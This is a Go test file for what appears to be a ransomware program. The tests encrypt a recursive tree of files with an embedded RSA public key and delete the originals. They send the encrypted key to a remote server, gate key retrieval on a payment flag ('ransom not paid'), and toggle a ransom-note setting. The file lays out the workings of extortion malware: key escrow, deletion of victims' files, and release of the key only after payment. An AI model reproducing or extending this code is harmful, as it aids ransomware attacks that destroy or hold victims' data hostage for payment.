package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"main/src/cli"
	wcc_crypto "main/src/crypto"
	"main/src/utils"
	"os"
	"path"
	"testing"
)

func createRecursiveFileHierarchy(t *testing.T) ([]string, string) {
	testDir := t.TempDir()
	cli.Settings.EncryptedFileExt = "kc"
	cli.Settings.LeaveNote = false
	cli.Settings.RawKey = true
	fileName := testDir + "/_testFile"
	testString := "This is a test string"
	c := 3
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	recursiveDir1 := testDir + "/testRecursion1"
	recursiveDir2 := testDir + "/testRecursion2"
	recursiveDir3 := testDir + "/wow/this/is/sooo/deep"
	recursiveDir4 := testDir + "/wow/this"
	os.MkdirAll(recursiveDir1, 0777)
	os.MkdirAll(recursiveDir2, 0777)
	os.MkdirAll(recursiveDir3, 0777)
	os.MkdirAll(recursiveDir4, 0777)
	fileName = path.Join(recursiveDir1, "recursive_1_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	fileName = path.Join(recursiveDir2, "recursive_2_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}

	fileName = path.Join(recursiveDir3, "recursive_3_")
	fullFileName := fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	fileName = path.Join(recursiveDir4, "recursive_4_")
	fullFileName = fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	return wcc_crypto.GetFilesInCurrentDir("txt", testDir, true), testDir
}

var key string = "2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541316c76556c47453430616430596965594271776e0d0a5467333930354b76766b56715337396d4e413846736a6b70586e42616675527870673130635454696c396c78526a396a415a59455441334261355959367949660d0a79494d38504b42714d416230726f714b495a4579624c322f49395a3361456f4b567835456757536d776a6c6f764b526f30775a717173324c61563045365a44440d0a43727638677472794e6a4a4c474e3777715879657a326748525846537972765372586e34337276446b4637395937346f6c347770724d51376d7a6c447845752f0d0a342b31374675796436485542623743654d7079354f734647646d6d3750663349575a546b544b7754766c582b2b2b4274415357617350796f78672b33596f6e390d0a304872626d523762536d59642b59685151485854352b455a774f766175674e7369394d3575526c303941642f733439416c6a66785266496e4b6d2f3169394f670d0a6f774944415141420d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d"

func tearDown() {
	os.Remove("./e_key.txt")
	os.Remove("./raw_key.bin")
	os.Remove("./decryption_hash.bin")
	os.Remove("./d_key.txt")
}

func TestEncryptionDecryptionScheme(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// key := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	StartEncryption(&dQue, key)
	for _, f := range files {
		// ff := filepath.Join(rootDir, f)
		err := os.Remove(f)
		if err != nil {
			log.Fatal("Failed to delete the file")
			t.Error(err)
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletion(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// key := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	cli.Settings.Delete = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletionSendOff(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// key := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	cli.Settings.Delete = true
	cli.Settings.RawKey = false
	cli.Settings.PaidStatus = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestSendoffAndReceiveKey(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	keyHex, err := utils.RetriveKeyByHash(hash)
	if err != nil {
		t.Error(err.Error())
	}
	assertionValue, _ := hex.DecodeString(keyHex)
	if string(assertionValue) != testString {
		t.Error("Test string missmatch")
	}
}

func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Not paid test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	_, err = utils.RetriveKeyByHash(hash)
	if err != nil {
		if err.Error() != "ransom not paid" {
			t.Error("Unexpected error")
		}
	} else {
		t.Error("Error expected")
	}
}

func TestOfflineDecryption(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	cli.Settings.SuppliedAESKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	cli.Settings.Delete = true
	cli.Settings.RawKey = false
	cli.Settings.PaidStatus = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	// prepare decrypted key
	ioutil.WriteFile("./d_key.txt", []byte(cli.Settings.SuppliedAESKey), 0777)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}
